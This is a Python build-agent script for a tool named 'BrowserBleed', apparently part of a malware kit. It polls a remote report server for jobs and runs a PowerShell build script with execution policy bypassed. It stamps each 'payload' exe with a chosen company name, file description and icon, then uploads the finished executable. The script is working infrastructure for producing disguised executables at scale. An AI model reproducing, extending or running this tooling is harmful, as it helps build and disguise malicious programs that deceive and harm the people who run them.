#!/usr/bin/env python3
"""
BrowserBleed Build Agent — polls the report server for queued builds,
runs build_windows.ps1, and uploads the resulting exe back.

Usage:
    python build_agent.py

Configure via deploy/config (auto-detected) or flags:
    python build_agent.py --server https://reports.example.com --key YOUR_API_KEY

Keep this running on your Windows build machine. It will pick up any build
jobs queued from the server UI and automatically upload the finished exe.
"""

import argparse
import http.client
import io
import json
import os
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import urllib.error


BANNER = """
  ██████╗ ██████╗  █████╗  ██████╗ ███████╗███╗   ██╗████████╗
  ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝
  ██████╔╝██████╔╝███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║
  ██╔══██╗██╔══██╗██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║
  ██████╔╝██║  ██║██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║
  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝
  Build Agent — polls server, builds payloads, uploads results
"""


def load_config(repo_root: str) -> dict:
    cfg = {}
    config_path = os.path.join(repo_root, "deploy", "config")
    if os.path.exists(config_path):
        with open(config_path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                cfg[k.strip()] = v.strip()
    return cfg


def api_request(server: str, key: str, method: str, path: str,
                body: bytes = None, content_type: str = None) -> tuple[int, bytes]:
    ctx = ssl.create_default_context()
    parsed = urllib.parse.urlparse(server)
    use_ssl = parsed.scheme == "https"
    host = parsed.netloc
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=30) if use_ssl \
        else http.client.HTTPConnection(host, timeout=30)
    headers = {"Authorization": f"Bearer {key}"}
    if content_type:
        headers["Content-Type"] = content_type
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, data


def claim_job(server: str, key: str):
    status, data = api_request(server, key, "POST", "/builds/claim")
    if status == 204:
        return None
    if status != 200:
        raise RuntimeError(f"claim failed: HTTP {status}")
    return json.loads(data)


def fail_job(server: str, key: str, job_id: str, error: str):
    body = json.dumps({"error": error}).encode()
    api_request(server, key, "POST", f"/builds/{job_id}/fail", body, "application/json")


def complete_job(server: str, key: str, job_id: str, exe_path: str):
    with open(exe_path, "rb") as f:
        exe_data = f.read()

    boundary = b"----BBAgentBoundary7XkT9w"
    fname = os.path.basename(exe_path).encode()
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="exe"; filename="' + fname + b'"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + exe_data + b"\r\n"
        b"--" + boundary + b"--\r\n"
    )
    ct = f"multipart/form-data; boundary={boundary.decode()}"
    status, data = api_request(server, key, "POST", f"/builds/{job_id}/complete", body, ct)
    if status != 200:
        raise RuntimeError(f"complete upload failed: HTTP {status}: {data[:200]}")


def download_icon(server: str, key: str, job_id: str, icon_ext: str) -> str | None:
    status, data = api_request(server, key, "GET", f"/builds/{job_id}/icon")
    if status != 200:
        return None
    icon_path = os.path.join(tempfile.gettempdir(), f"bb_icon_{job_id}{icon_ext}")
    with open(icon_path, "wb") as f:
        f.write(data)
    return icon_path


def process_job(server: str, key: str, repo_root: str, job: dict):
    job_id   = job["id"]
    exe_name = job["exe_name"]
    preset   = job["preset"]
    print(f"  [*] Building: preset={preset}  exe={exe_name}.exe  id={job_id}")

    ps1 = os.path.join(repo_root, "build_windows.ps1")
    if not os.path.exists(ps1):
        raise RuntimeError(f"build_windows.ps1 not found at {ps1}")

    cmd = [
        "powershell", "-ExecutionPolicy", "Bypass", "-File", ps1,
        "-Preset",  preset,
        "-ExeName", exe_name,
    ]
    if job.get("company"):   cmd += ["-Company",  job["company"]]
    if job.get("file_desc"): cmd += ["-FileDesc", job["file_desc"]]

    if job.get("icon_ext"):
        icon_path = download_icon(server, key, job_id, job["icon_ext"])
        if icon_path:
            cmd += ["-IconFile", icon_path]
            print(f"  [*] Using custom icon: {icon_path}")

    result = subprocess.run(cmd, capture_output=True, text=True, cwd=repo_root)

    exe_path = os.path.join(repo_root, "payloads", exe_name + ".exe")
    if not os.path.exists(exe_path):
        err = (result.stderr or "")[-1500:] + (result.stdout or "")[-500:]
        raise RuntimeError(err or "Build produced no output")

    print(f"  [*] Uploading {exe_name}.exe ({os.path.getsize(exe_path) // 1024} KB)…")
    complete_job(server, key, job_id, exe_path)
    print(f"  [+] Done: {exe_name}.exe uploaded successfully")


def main():
    repo_root = os.path.dirname(os.path.abspath(__file__))
    cfg = load_config(repo_root)

    parser = argparse.ArgumentParser(description="BrowserBleed Build Agent")
    parser.add_argument("--server",   default=cfg.get("DOMAIN", ""),
                        help="Report server URL (e.g. https://reports.example.com)")
    parser.add_argument("--key",      default=cfg.get("BB_API_KEY", ""),
                        help="API key (same as BB_API_KEY in deploy/config)")
    parser.add_argument("--interval", type=int, default=5,
                        help="Poll interval in seconds (default: 5)")
    args = parser.parse_args()

    # Auto-prefix https:// if DOMAIN was used (no scheme)
    server = args.server
    if server and "://" not in server:
        server = "https://" + server

    if not server:
        print("[!] --server is required (or set DOMAIN in deploy/config)")
        sys.exit(1)
    if not args.key:
        print("[!] --key is required (or set BB_API_KEY in deploy/config)")
        sys.exit(1)

    print(BANNER)
    print(f"  Server:   {server}")
    print(f"  Key:      {args.key[:4]}****")
    print(f"  Repo:     {repo_root}")
    print(f"  Interval: {args.interval}s")
    print()

    # Verify connectivity
    try:
        status, _ = api_request(server, args.key, "GET", "/builds")
        if status == 200:
            print("[+] Connected to server. Waiting for build jobs…\n")
        elif status == 401:
            print("[!] Authentication failed — check your API key")
            sys.exit(1)
        else:
            print(f"[!] Unexpected server response: HTTP {status}")
    except Exception as e:
        print(f"[!] Cannot reach server: {e}")
        sys.exit(1)

    consecutive_errors = 0
    while True:
        try:
            job = claim_job(server, args.key)
            if job:
                consecutive_errors = 0
                try:
                    process_job(server, args.key, repo_root, job)
                except Exception as e:
                    err = str(e)
                    print(f"  [!] Build failed: {err[:200]}")
                    try:
                        fail_job(server, args.key, job["id"], err)
                    except Exception as fe:
                        print(f"  [!] Could not report failure: {fe}")
            else:
                consecutive_errors = 0
        except KeyboardInterrupt:
            print("\n[*] Stopped.")
            break
        except Exception as e:
            consecutive_errors += 1
            print(f"[!] Poll error ({consecutive_errors}): {e}")
            if consecutive_errors >= 5:
                print("[!] 5 consecutive errors — check server connectivity")
                consecutive_errors = 0

        time.sleep(args.interval)


if __name__ == "__main__":
    main()
